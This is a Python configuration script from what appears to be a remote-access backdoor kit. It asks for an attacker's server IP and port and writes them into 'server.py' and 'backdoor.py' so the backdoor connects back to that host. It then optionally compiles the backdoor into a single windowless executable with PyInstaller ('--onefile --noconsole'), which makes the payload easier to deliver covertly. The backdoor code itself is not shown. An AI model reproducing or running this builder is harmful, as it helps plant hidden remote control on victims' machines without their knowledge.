import os

IP = input("[?] Enter the Server IP: ")
PORT = input("[?] Enter the Connection Port: ")

# Server File Configuration

print("[*] Server File Being Configured...")
server_file = open("server.py", 'r')
server_file_lines = server_file.readlines()
server_file.close()

for count in range(0, len(server_file_lines)):
    if server_file_lines[count][0:9] == "HOST_IP =":
        server_file_lines[count] = f"HOST_IP = '{IP}'\n"
        break

for count in range(0, len(server_file_lines)):
    if server_file_lines[count][0:6] == "PORT =":
        server_file_lines[count] = f"PORT = {PORT}\n"
        break


server_file = open("server.py", "w")
server_file.writelines(server_file_lines)
server_file.close()
print("[*] Server File Configuration Complete")

# Backdoor File Configuration

print("[*] Backdoor File Being Configured...")
backdoor_file = open("backdoor.py", 'r')
backdoor_file_lines = backdoor_file.readlines()
backdoor_file.close()

for count in range(0, len(backdoor_file_lines)):
    if backdoor_file_lines[count][0:9] == "HOST_IP =":
        backdoor_file_lines[count] = f"HOST_IP = '{IP}'\n"
        break

for count in range(0, len(backdoor_file_lines)):
    if backdoor_file_lines[count][0:6] == "PORT =":
        backdoor_file_lines[count] = f"PORT = {PORT}\n"
        break

backdoor_file = open("backdoor.py", "w")
backdoor_file.writelines(backdoor_file_lines)
backdoor_file.close()
print("[*] Backdoor File Configuration Complete")

# Create EXE File

def exe_generator():
    option = input("[?] Would you like to make the exe file? (pyinstaller required) [y/n]: ")
    if option == "y":
        print("[*] Attempting to create backdoor executable\n")
        try:
            os.system("pyinstaller backdoor.py --onefile --noconsole")
            print("[*] Executable created successfully")
            print("[*] Setup Complete")
            print("[*] Exiting Program...")
        except:
            print("[!] An error has occurred")
    elif option == "n":
        print("[*] Setup Complete")
        print("[*] Exiting Program...")
    else:
        print("[!] Invalid option")
        exe_generator()
    

exe_generator()